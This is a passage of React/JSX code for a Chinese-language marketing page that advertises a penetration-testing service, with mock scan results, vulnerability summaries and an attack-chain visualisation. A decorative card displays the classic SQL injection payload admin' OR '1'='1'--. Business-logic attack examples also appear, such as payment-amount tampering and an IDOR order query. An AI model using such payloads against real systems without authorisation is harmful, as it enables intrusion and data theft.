            <div>
              <div style={{ display: 'flex', gap: 10, marginBottom: 20, flexWrap: 'wrap' }}>
                <Badge style={{ background: 'rgba(239,68,68,0.2)', color: '#fca5a5', border: '1px solid rgba(239,68,68,0.35)', fontSize: 12 }}>系统安全</Badge>
                <Badge style={{ background: 'rgba(245,158,11,0.15)', color: '#fde68a', border: '1px solid rgba(245,158,11,0.3)', fontSize: 12 }}>专业渗透测试服务</Badge>
              </div>
              <h1 style={{ fontSize: 'clamp(26px,3.2vw,46px)', fontWeight: 900, color: '#fff', margin: '0 0 18px', lineHeight: 1.15 }}>
                智能化网络<br />
                <span style={{ background: 'linear-gradient(135deg,#f87171,#fb923c)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent' }}>
                  渗透测试服务
                </span>
              </h1>
              <p style={{ fontSize: 15, color: '#94a3b8', lineHeight: 1.8, margin: '0 0 32px', maxWidth: 420 }}>
                模拟黑客真实攻击视角，人机协同验证系统防御边界。CCRC 一级资质，0 误报承诺，覆盖 Web / API / 业务逻辑全场景。
              </p>
              <div style={{ display: 'flex', gap: 12 }}>
                <button
                  onClick={() => setShowBooking(true)}
                  style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '13px 26px', background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', borderRadius: 10, fontSize: 14, fontWeight: 700, cursor: 'pointer', boxShadow: '0 4px 20px rgba(239,68,68,0.45)' }}>
                  <Calendar size={16} /> 预约专家演示
                </button>
              </div>
            </div>

            {/* Right: animated stats */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
              <motion.div animate={{ y: [0, -6, 0] }} transition={{ duration: 4, repeat: Infinity, ease: 'easeInOut' }}
                style={{ background: 'rgba(15,23,42,0.7)', backdropFilter: 'blur(20px)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 16, padding: '18px 22px', boxShadow: '0 16px 40px rgba(239,68,68,0.15)' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 14 }}>
                  <div style={{ width: 7, height: 7, borderRadius: '50%', background: '#ef4444', boxShadow: '0 0 8px #ef4444' }} />
                  <span style={{ fontSize: 11, color: '#64748b', fontFamily: 'monospace' }}>渗透测试 · 实时扫描中</span>
                  <span style={{ marginLeft: 'auto', padding: '2px 8px', background: 'rgba(239,68,68,0.18)', border: '1px solid rgba(239,68,68,0.35)', borderRadius: 8, fontSize: 10, color: '#fca5a5', fontWeight: 700 }}>ATTACKING</span>
                </div>
                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(3,1fr)', gap: 10, marginBottom: 14 }}>
                  {[{ val: '312', label: '开放端口', color: '#f87171' }, { val: '18', label: '子域名', color: '#fb923c' }, { val: '3', label: '高危指纹', color: '#fbbf24' }].map(s => (
                    <div key={s.label} style={{ textAlign: 'center', padding: '10px', background: `${s.color}10`, border: `1px solid ${s.color}25`, borderRadius: 10 }}>
                      <div style={{ fontSize: 20, fontWeight: 800, color: s.color }}>{s.val}</div>
                      <div style={{ fontSize: 10, color: '#64748b', marginTop: 2 }}>{s.label}</div>
                    </div>
                  ))}
                </div>
                <div style={{ height: 3, background: 'rgba(255,255,255,0.05)', borderRadius: 2, overflow: 'hidden' }}>
                  <motion.div animate={{ width: ['0%', '100%', '0%'] }} transition={{ duration: 3, repeat: Infinity }}
                    style={{ height: '100%', background: 'linear-gradient(90deg,#ef4444,#f97316)', borderRadius: 2 }} />
                </div>
              </motion.div>
              <motion.div animate={{ y: [0, 5, 0] }} transition={{ duration: 3.5, repeat: Infinity, ease: 'easeInOut', delay: 0.5 }}
                style={{ background: 'rgba(30,41,59,0.75)', backdropFilter: 'blur(14px)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 14, padding: '14px 18px', marginLeft: 24, boxShadow: '0 12px 32px rgba(0,0,0,0.4)' }}>
                <div style={{ display: 'flex', alignItems: 'center', gap: 7, marginBottom: 10 }}>
                  <AlertTriangle size={13} style={{ color: '#ef4444' }} />
                  <span style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace' }}>高危漏洞已确认 · SQL 注入</span>
                </div>
                <div style={{ background: '#0f172a', borderRadius: 7, padding: '8px 12px', fontSize: 11, fontFamily: 'monospace', color: '#fca5a5', marginBottom: 9, lineHeight: 1.6 }}>
                  <span style={{ color: '#64748b' }}>payload: </span>admin' OR '1'='1'--
                </div>
                <div style={{ display: 'flex', gap: 6 }}>
                  {[{ label: 'CRITICAL', color: '#ef4444' }, { label: 'CWE-89', color: '#f97316' }].map(t => (
                    <span key={t.label} style={{ padding: '2px 8px', background: `${t.color}14`, border: `1px solid ${t.color}30`, borderRadius: 6, fontSize: 10, color: t.color, fontFamily: 'monospace', fontWeight: 700 }}>{t.label}</span>
                  ))}
                </div>
              </motion.div>
            </div>
          </div>
        </div>
      </section>

      <StickySubNav items={[
        { id: 'pt-capabilities', label: '核心能力' },
        { id: 'pt-scenarios', label: '应用场景' },
        { id: 'pt-process', label: '测试流程' },
        { id: 'pt-cta', label: '立即检测' },
      ]} />

      {/* ══ 2. CAPABILITIES — Zig-Zag layout (mirrors CodeVulnerabilityAudit) ══ */}
      <section id="pt-capabilities" style={{ background: '#f8fafc', borderTop: '1px solid #e2e8f0' }}>
        <div style={{ maxWidth: 1160, margin: '0 auto', padding: '80px 40px 100px' }}>
          <ScrollReveal>
            <div style={{ textAlign: 'center', marginBottom: 64 }}>
              <div style={{ display: 'inline-block', fontSize: 13, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', fontWeight: 700, marginBottom: 12, padding: '4px 16px', background: '#fff1f2', borderRadius: 20 }}>
                核心能力矩阵
              </div>
              <h2 style={{ fontSize: 'clamp(28px,3.5vw,44px)', fontWeight: 900, color: '#0f172a', margin: '0 0 12px' }}>不止于扫描，深度验证真实风险</h2>
              <p style={{ fontSize: 15, color: '#64748b', margin: 0 }}>人机协同覆盖 Web / API / 业务逻辑全场景，0 误报承诺，每个漏洞均附带 PoC 与修复建议</p>
            </div>
          </ScrollReveal>

          {[
            {
              id: '01', side: 'left' as const, color: '#6366f1',
              panelBg: 'linear-gradient(145deg,#f0f4ff,#e8edfd)',
              title: '资产自动发现',
              heading: '3 分钟完成万级资产指纹画像',
              desc: '自动识别域名、IP、端口、服务，深度探测 CMS 类型、框架版本、WAF 品牌等指纹信息，构建完整攻击面地图，为后续漏洞挖掘奠定精准基础。',
              tags: ['子域名枚举', '全端口扫描', '指纹库 50000+', 'WAF 识别'],
              panel: (
                <div>
                  <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>资产扫描结果</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 7 }}>
                    {[
                      { host: 'api.target.com', port: '443', service: 'Nginx 1.24', risk: 'HIGH', color: '#ef4444' },
                      { host: '10.0.1.32',      port: '6379', service: 'Redis 6.2', risk: 'HIGH', color: '#ef4444' },
                      { host: 'admin.target.cn', port: '8080', service: 'Shiro 1.6.0', risk: 'MED', color: '#d97706' },
                      { host: 'static.target.com',port: '80', service: 'Apache 2.4', risk: 'LOW', color: '#16a34a' },
                    ].map(r => (
                      <div key={r.host} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '8px 12px', background: '#fff', borderRadius: 8, border: `1px solid ${r.color}18`, fontSize: 11 }}>
                        <div style={{ width: 5, height: 5, borderRadius: '50%', background: r.color, flexShrink: 0 }} />
                        <span style={{ flex: 1, color: '#374151', fontFamily: 'monospace', fontSize: 10.5 }}>{r.host}:{r.port}</span>
                        <span style={{ color: '#64748b', fontSize: 10 }}>{r.service}</span>
                        <span style={{ padding: '1px 6px', background: `${r.color}12`, color: r.color, borderRadius: 4, fontWeight: 700, fontSize: 9 }}>{r.risk}</span>
                      </div>
                    ))}
                  </div>
                  <div style={{ marginTop: 12, padding: '8px 12px', background: 'rgba(99,102,241,0.07)', borderRadius: 8, border: '1px solid rgba(99,102,241,0.15)', fontSize: 11, color: '#4f46e5' }}>
                    已发现 312 个端口 · 18 个子域名 · 3 个高危指纹 · 耗时 2m 47s
                  </div>
                </div>
              ),
            },
            {
              id: '02', side: 'right' as const, color: '#ef4444',
              panelBg: 'linear-gradient(145deg,#fff1f2,#fde8e8)',
              title: '漏洞深度验证',
              heading: '专家人工复核，承诺 0 误报',
              desc: '不止于扫描器输出，OSCP 持证专家对每个发现的漏洞进行人工复核与 PoC 利用验证。覆盖 SQL 注入、XSS、RCE、SSRF、越权访问等全部高危漏洞类型，真实可利用才算漏洞。',
              tags: ['SQL 注入', 'XSS / RCE', 'SSRF', '越权访问', '0 误报'],
              panel: (
                <div>
                  <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>漏洞验证报告摘要</div>
                  <div style={{ display: 'flex', gap: 8, marginBottom: 12 }}>
                    {[{ label: '高危', count: '4', color: '#ef4444' }, { label: '中危', count: '7', color: '#d97706' }, { label: '低危', count: '12', color: '#2563eb' }].map(s => (
                      <div key={s.label} style={{ flex: 1, textAlign: 'center', padding: '10px 6px', background: `${s.color}09`, border: `1px solid ${s.color}22`, borderRadius: 9 }}>
                        <div style={{ fontSize: 22, fontWeight: 800, color: s.color, lineHeight: 1 }}>{s.count}</div>
                        <div style={{ fontSize: 10, color: s.color, marginTop: 3 }}>{s.label}漏洞</div>
                      </div>
                    ))}
                  </div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                    {[
                      { vuln: 'SQL 注入 (CWE-89)', status: '已验证利用', color: '#ef4444' },
                      { vuln: 'Shiro 反序列化 RCE', status: '已验证利用', color: '#ef4444' },
                      { vuln: '水平越权访问', status: '人工复核中', color: '#d97706' },
                    ].map(v => (
                      <div key={v.vuln} style={{ display: 'flex', alignItems: 'center', gap: 8, padding: '7px 10px', background: '#fff', borderRadius: 7, border: `1px solid ${v.color}18`, fontSize: 11 }}>
                        <div style={{ width: 6, height: 6, borderRadius: '50%', background: v.color, flexShrink: 0 }} />
                        <span style={{ flex: 1, color: '#0f172a', fontWeight: 500 }}>{v.vuln}</span>
                        <span style={{ fontSize: 10, color: v.color, fontWeight: 600 }}>{v.status}</span>
                      </div>
                    ))}
                  </div>
                  <div style={{ marginTop: 10, padding: '7px 10px', background: 'rgba(239,68,68,0.06)', borderRadius: 7, border: '1px solid rgba(239,68,68,0.15)', fontSize: 10.5, color: '#b91c1c' }}>
                    误报率 0% · 所有高危漏洞均有完整 PoC 复现视频
                  </div>
                </div>
              ),
            },
            {
              id: '03', side: 'left' as const, color: '#f59e0b',
              panelBg: 'linear-gradient(145deg,#fffbf0,#fef3c7)',
              title: '业务逻辑测试',
              heading: '专注支付、越权、验证码绕过等逻辑漏洞',
              desc: '纯扫描器无法覆盖的业务特有安全场景：支付金额篡改、优惠券滥用、账号越权访问、验证码重放，需要安全专家结合业务理解手动测试，是挖出核心业务风险的关键。',
              tags: ['支付逻辑绕过', '账号越权', '验证码重放', '接口未授权'],
              panel: (
                <div>
                  <div style={{ fontSize: 11, fontWeight: 700, color: '#374151', textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 12 }}>业务逻辑漏洞验证</div>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
                    {[
                      { scenario: '支付金额篡改', step: '修改 amount 参数 0.01 → 原价 ¥999 商品', impact: '直接经济损失', color: '#ef4444' },
                      { scenario: '验证码可重放', step: '同一验证码发送 100+ 次均成功校验', impact: '账号暴破风险', color: '#d97706' },
                      { scenario: 'API 水平越权', step: 'GET /api/order?uid=12345 可查他人订单', impact: '数据泄露', color: '#d97706' },
                    ].map(s => (
                      <div key={s.scenario} style={{ background: '#fff', borderRadius: 10, padding: '12px 14px', border: `1.5px solid ${s.color}20` }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 6, marginBottom: 5 }}>
                          <span style={{ fontSize: 12, fontWeight: 700, color: '#0f172a' }}>{s.scenario}</span>
                          <span style={{ marginLeft: 'auto', fontSize: 10, padding: '1px 6px', background: `${s.color}12`, color: s.color, borderRadius: 4, fontWeight: 700 }}>{s.impact}</span>
                        </div>
                        <div style={{ fontSize: 10.5, color: '#64748b', fontFamily: 'monospace', lineHeight: 1.5 }}>{s.step}</div>
                      </div>
                    ))}
                  </div>
                </div>
              ),
            },
          ].map((item, idx) => {
            const isLeft = item.side === 'left';
            return (
              <ScrollReveal key={item.id}>
                <div style={{
                  display: 'grid',
                  gridTemplateColumns: isLeft ? '3fr 2fr' : '2fr 3fr',
                  gap: 52,
                  alignItems: 'center',
                  marginTop: idx === 0 ? 0 : 56,
                }}>
                  {/* Visual panel — order swaps for zig-zag */}
                  <div style={{ order: isLeft ? 0 : 1 }}>
                    <div style={{
                      background: item.panelBg,
                      borderRadius: 22,
                      padding: '36px 32px',
                      position: 'relative',
                      overflow: 'hidden',
                      boxShadow: `0 16px 56px ${item.color}12, 0 4px 16px rgba(0,0,0,0.05)`,
                      border: `1.5px solid ${item.color}22`,
                    }}>
                      <div style={{ position: 'absolute', top: -12, left: 16, fontSize: 120, fontWeight: 900, color: item.color + '18', lineHeight: 1, userSelect: 'none', fontFamily: 'monospace' }}>{item.id}</div>
                      <div style={{ position: 'relative', zIndex: 1 }}>{item.panel}</div>
                    </div>
                  </div>
                  {/* Text content */}
                  <div style={{ order: isLeft ? 1 : 0 }}>
                    <div style={{ fontSize: 16, color: item.color, letterSpacing: '0.04em', fontWeight: 800, marginBottom: 12 }}>
                      功能 {item.id} · {item.title}
                    </div>
                    <h3 style={{ fontSize: 24, fontWeight: 800, color: '#0f172a', margin: '0 0 16px', lineHeight: 1.35 }}>{item.heading}</h3>
                    <p style={{ fontSize: 14.5, color: '#64748b', lineHeight: 1.8, margin: '0 0 24px' }}>{item.desc}</p>
                    <div style={{ display: 'flex', flexWrap: 'wrap', gap: 8, marginBottom: 30 }}>
                      {item.tags.map(t => (
                        <span key={t} style={{ fontSize: 12, padding: '6px 14px', borderRadius: 20, background: item.color + '10', color: item.color, border: `1px solid ${item.color}25`, fontWeight: 600 }}>{t}</span>
                      ))}
                    </div>
                  </div>
                </div>
              </ScrollReveal>
            );
          })}
        </div>
      </section>

      {/* ══ 3. ATTACK CHAIN — light background ═════════════════════ */}
      <ScrollReveal>
        <section style={{ background: 'linear-gradient(135deg,#f1f5f9,#e2e8f0)', padding: '88px 0', borderTop: '1px solid #e2e8f0', borderBottom: '1px solid #e2e8f0' }}>
          <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px' }}>
            <div style={{ textAlign: 'center', marginBottom: 56 }}>
              <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>攻击链路可视化</p>
              <h2 style={{ fontSize: 'clamp(26px,3.2vw,40px)', fontWeight: 900, color: '#0f172a', margin: '0 0 12px', lineHeight: 1.15 }}>
                全攻击链可视，让安全风险看得见
              </h2>
              <p style={{ fontSize: 15, color: '#64748b', maxWidth: 520, margin: '0 auto' }}>
                基于 MITRE ATT&CK 框架，模拟真实 APT 攻击路径，悬停查看各阶段详细技术手段
              </p>
            </div>

            {/* Chain */}
            <div style={{ display: 'flex', alignItems: 'stretch', gap: 4, marginBottom: 24 }}>
              {ATTACK_PHASES.map((phase, i) => {
                const Icon = phase.icon;
                const isHov = hoveredPhase === phase.id;
                return (
                  <React.Fragment key={phase.id}>
                    <motion.div
                      onHoverStart={() => setHoveredPhase(phase.id)}
                      onHoverEnd={() => setHoveredPhase(null)}
                      animate={{ scale: isHov ? 1.03 : 1 }} transition={{ duration: 0.2 }}
                      style={{ flex: 1, padding: '20px 18px 18px', borderRadius: 14, cursor: 'pointer', background: isHov ? `${phase.color}14` : '#fff', border: `1.5px solid ${isHov ? phase.color : '#e2e8f0'}`, boxShadow: isHov ? `0 0 28px ${phase.color}25` : '0 2px 8px rgba(0,0,0,0.04)', transition: 'border 0.2s, background 0.2s, box-shadow 0.2s' }}>
                      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 10 }}>
                        <div style={{ width: 36, height: 36, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', background: `${phase.color}16`, border: `1px solid ${phase.color}35` }}>
                          <Icon style={{ width: 18, height: 18, color: phase.color }} />
                        </div>
                        <div>
                          <div style={{ fontSize: 10, color: phase.color, fontWeight: 700, fontFamily: 'monospace' }}>PHASE {phase.step}</div>
                          <div style={{ fontSize: 15, fontWeight: 800, color: '#0f172a' }}>{phase.label}</div>
                        </div>
                      </div>
                      <div style={{ fontSize: 11.5, color: '#64748b', marginBottom: 10 }}>{phase.desc}</div>
                      <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
                        {phase.findings.map(f => (
                          <div key={f} style={{ display: 'flex', alignItems: 'center', gap: 5, fontSize: 11 }}>
                            <div style={{ width: 4, height: 4, borderRadius: '50%', background: phase.color, flexShrink: 0 }} />
                            <span style={{ color: '#64748b' }}>{f}</span>
                          </div>
                        ))}
                      </div>
                    </motion.div>
                    {i < ATTACK_PHASES.length - 1 && (
                      <div style={{ display: 'flex', alignItems: 'center', paddingBottom: 8 }}>
                        <motion.div animate={{ x: [0, 4, 0] }} transition={{ duration: 1.5, repeat: Infinity }}
                          style={{ color: ATTACK_PHASES[i + 1].color, opacity: 0.5 }}>
                          <ChevronRight size={18} />
                        </motion.div>
                      </div>
                    )}
                  </React.Fragment>
                );
              })}
            </div>

            {/* Detail panel */}
            <AnimatePresence mode="wait">
              {hoveredPhase ? (
                <motion.div key={hoveredPhase} initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0, y: -10 }} transition={{ duration: 0.2 }}
                  style={{ background: '#fff', border: '1px solid #e2e8f0', borderRadius: 16, padding: '24px 28px', boxShadow: '0 4px 20px rgba(0,0,0,0.06)' }}>
                  {(() => {
                    const phase = ATTACK_PHASES.find(p => p.id === hoveredPhase)!;
                    return (
                      <div>
                        <div style={{ fontSize: 12, fontWeight: 700, color: phase.color, textTransform: 'uppercase', letterSpacing: '0.08em', marginBottom: 16 }}>
                          {phase.label} 阶段 · 技术手段详情
                        </div>
                        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4,1fr)', gap: 14 }}>
                          {phase.techniques.map(t => (
                            <div key={t.name} style={{ background: '#f8fafc', border: `1px solid ${phase.color}18`, borderRadius: 10, padding: '14px' }}>
                              <div style={{ fontSize: 13, fontWeight: 700, color: '#1e293b', marginBottom: 6 }}>{t.name}</div>
                              <div style={{ fontSize: 11.5, color: '#64748b', lineHeight: 1.65, fontFamily: 'monospace', wordBreak: 'break-all' }}>{t.detail}</div>
                            </div>
                          ))}
                        </div>
                      </div>
                    );
                  })()}
                </motion.div>
              ) : (
                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
                  style={{ textAlign: 'center', padding: '18px 0' }}>
                  <p style={{ fontSize: 13, color: '#94a3b8', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8 }}>
                    <Radar size={14} style={{ color: '#ef4444' }} />
                    将鼠标悬停在任意阶段卡片上，查看该阶段使用的具体攻击技术
                  </p>
                </motion.div>
              )}
            </AnimatePresence>
          </div>
        </section>
      </ScrollReveal>

      {/* ══ 4. INDUSTRY — vertical cards ═══════════════════════════ */}
      <ScrollReveal>
        <section id="pt-scenarios" style={{ background: '#f8fafc', padding: '80px 0', borderTop: '1px solid #e2e8f0' }}>
          <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px' }}>
            <div style={{ textAlign: 'center', marginBottom: 56 }}>
              <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>行业解决方案</p>
              <h2 style={{ fontSize: 'clamp(26px,3.2vw,38px)', fontWeight: 900, color: '#0f172a', margin: '0 0 12px' }}>
                场景化落地方案
              </h2>
              <p style={{ fontSize: 16, color: '#64748b' }}>不只是功能清单 — 给出完整安全路径，直面各行业核心痛点</p>
            </div>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 32 }}>
              {INDUSTRY_SOLUTIONS.map(sol => (
                <ScrollReveal key={sol.id}>
                  <div style={{ background: '#fff', border: '1px solid #e2e8f0', borderRadius: 20, overflow: 'hidden', boxShadow: '0 4px 20px rgba(0,0,0,0.05)' }}>
                    <div style={{ height: 4, background: `linear-gradient(90deg,${sol.accentColor},${sol.accentColor}88)` }} />
                    <div style={{ padding: '32px 36px', display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 40, alignItems: 'start' }}>
                      <div>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 14 }}>
                          <div style={{ fontSize: 28 }}>{sol.icon}</div>
                          <span style={{ padding: '3px 10px', background: `${sol.accentColor}15`, border: `1px solid ${sol.accentColor}40`, borderRadius: 20, fontSize: 11, color: sol.accentColor, fontWeight: 700 }}>{sol.tag}</span>
                        </div>
                        <h3 style={{ margin: '0 0 6px', fontSize: 22, fontWeight: 800, color: '#0f172a' }}>{sol.title}</h3>
                        <p style={{ margin: '0 0 16px', fontSize: 13, color: sol.accentColor, fontWeight: 600 }}>{sol.subtitle}</p>
                        <p style={{ margin: '0 0 24px', fontSize: 14, color: '#475569', lineHeight: 1.8 }}>{sol.desc}</p>
                        <div style={{ display: 'flex', gap: 16, marginBottom: 24 }}>
                          {sol.metrics.map(m => (
                            <div key={m.label} style={{ padding: '12px 16px', background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: 12, textAlign: 'center', minWidth: 80 }}>
                              <div style={{ fontSize: 18, fontWeight: 900, color: sol.accentColor }}>{m.value}</div>
                              <div style={{ fontSize: 11, color: '#64748b', marginTop: 3 }}>{m.label}</div>
                            </div>
                          ))}
                        </div>
                        <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                          {sol.tags.map(t => (
                            <span key={t} style={{ padding: '4px 12px', background: '#f1f5f9', borderRadius: 20, fontSize: 12, color: '#475569', fontWeight: 500 }}>{t}</span>
                          ))}
                        </div>
                      </div>
                      <div>
                        <p style={{ margin: '0 0 16px', fontSize: 12, fontWeight: 700, color: '#94a3b8', textTransform: 'uppercase', letterSpacing: '0.08em' }}>实际效果预览</p>
                        {sol.mock}
                      </div>
                    </div>
                  </div>
                </ScrollReveal>
              ))}
            </div>
          </div>
        </section>
      </ScrollReveal>

      {/* ══ 5. SERVICE FLOW ════════════════════════════════════════ */}
      <ScrollReveal>
        <section id="pt-process" style={{ background: '#fff', padding: '80px 0', borderTop: '1px solid #e2e8f0' }}>
          <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px' }}>
            <div style={{ textAlign: 'center', marginBottom: 56 }}>
              <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>标准化服务流程</p>
              <h2 style={{ fontSize: 'clamp(26px,3.2vw,38px)', fontWeight: 900, color: '#0f172a', margin: 0 }}>
                五步闭环，合规高效交付
              </h2>
            </div>
            <div style={{ position: 'relative' }}>
              <div style={{ position: 'absolute', left: 28, top: 40, bottom: 40, width: 2, background: 'linear-gradient(to bottom,#6366f1,#3b82f6,#f59e0b,#ef4444,#10b981)', borderRadius: 1, opacity: 0.2 }} />
              <div style={{ display: 'flex', flexDirection: 'column', gap: 20 }}>
                {SERVICE_STEPS.map(s => {
                  const Icon = s.icon;
                  return (
                    <div key={s.step} style={{ display: 'flex', gap: 20, alignItems: 'flex-start' }}>
                      <div style={{ width: 56, height: 56, borderRadius: '50%', background: `${s.color}14`, border: `2px solid ${s.color}35`, display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0, position: 'relative', zIndex: 1 }}>
                        <Icon style={{ width: 22, height: 22, color: s.color }} />
                      </div>
                      <div style={{ flex: 1, background: '#f8fafc', border: '1px solid #e2e8f0', borderRadius: 14, padding: '18px 22px', marginTop: 6 }}>
                        <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 8 }}>
                          <span style={{ fontSize: 10, fontWeight: 700, color: s.color, textTransform: 'uppercase', letterSpacing: '0.06em', padding: '2px 8px', background: `${s.color}12`, border: `1px solid ${s.color}25`, borderRadius: 20 }}>Step {s.step}</span>
                          <h3 style={{ margin: 0, fontSize: 16, fontWeight: 700, color: '#0f172a' }}>{s.title}</h3>
                        </div>
                        <p style={{ margin: 0, fontSize: 13.5, color: '#475569', lineHeight: 1.75 }}>{s.desc}</p>
                      </div>
                    </div>
                  );
                })}
              </div>
            </div>
          </div>
        </section>
      </ScrollReveal>

      {/* ══ 6. CREDENTIALS — light background ══════════════════════ */}
      <ScrollReveal>
        <section style={{ background: 'linear-gradient(135deg,#f8fafc,#f1f5f9)', padding: '72px 0', borderTop: '1px solid #e2e8f0' }}>
          <div style={{ maxWidth: 1200, margin: '0 auto', padding: '0 48px', textAlign: 'center' }}>
            <p style={{ fontSize: 12, fontWeight: 700, color: '#ef4444', textTransform: 'uppercase', letterSpacing: '0.12em', margin: '0 0 10px' }}>资质与信任背书</p>
            <h2 style={{ fontSize: 'clamp(24px,2.8vw,34px)', fontWeight: 900, color: '#0f172a', margin: '0 0 8px' }}>
              国家级漏洞库技术支撑单位，合规无忧
            </h2>
            <p style={{ fontSize: 14, color: '#64748b', margin: '0 0 48px' }}>
              CCRC 一级资质 · CNCVE 成员 · ISO 27001 认证，所有测试均有完整合法授权书
            </p>
            <div style={{ display: 'flex', gap: 16, justifyContent: 'center', flexWrap: 'wrap' }}>
              {CREDENTIALS.map(c => {
                const Icon = c.icon;
                return (
                  <div key={c.label} style={{ background: '#fff', border: `1.5px solid ${c.color}22`, borderRadius: 16, padding: '22px 28px', minWidth: 140, textAlign: 'center', boxShadow: `0 4px 16px ${c.color}08` }}>
                    <div style={{ width: 44, height: 44, borderRadius: 12, background: `${c.color}12`, display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 12px' }}>
                      <Icon style={{ width: 22, height: 22, color: c.color }} />
                    </div>
                    <div style={{ fontSize: 16, fontWeight: 800, color: '#0f172a', marginBottom: 4 }}>{c.label}</div>
                    <div style={{ fontSize: 11, color: '#64748b', lineHeight: 1.5 }}>{c.sub}</div>
                  </div>
                );
              })}
            </div>
          </div>
        </section>
      </ScrollReveal>

      {/* ══ CTA — 立即发现您系统的安全隐患 ════════════════════════ */}
      <section id="pt-cta" style={{ background: 'linear-gradient(135deg,#fef2f2,#fff7ed)', padding: '72px 48px', textAlign: 'center', borderTop: '1px solid #fee2e2' }}>
        <div style={{ maxWidth: 640, margin: '0 auto' }}>
          <h2 style={{ fontSize: 32, fontWeight: 900, color: '#0f172a', margin: '0 0 12px' }}>
            立即发现您系统的安全隐患
          </h2>
          <p style={{ fontSize: 15, color: '#64748b', margin: '0 0 32px', lineHeight: 1.7 }}>
            首次合作提供免费初步侦察报告（资产发现 + 风险摘要），无需任何前期费用。预约专家 1 对 1 为您定制渗透测试方案。
          </p>
          <div style={{ display: 'flex', gap: 14, justifyContent: 'center', flexWrap: 'wrap' }}>
            <button
              onClick={() => setShowBooking(true)}
              style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '14px 32px', background: 'linear-gradient(135deg,#ef4444,#f97316)', color: '#fff', border: 'none', borderRadius: 12, fontSize: 15, fontWeight: 700, cursor: 'pointer', boxShadow: '0 6px 24px rgba(239,68,68,0.38)' }}>
              <Calendar size={17} /> 立即开始
            </button>
            <button
              onClick={() => { window.scrollTo(0, 0); navigate('/help-docs'); }}
              style={{ display: 'inline-flex', alignItems: 'center', gap: 8, padding: '14px 26px', background: '#fff', color: '#374151', border: '1.5px solid #e2e8f0', borderRadius: 12, fontSize: 15, fontWeight: 600, cursor: 'pointer' }}>
              <BookOpen size={17} /> 查看服务说明
            </button>
          </div>
        </div>
      </section>

    </div>
  );
}
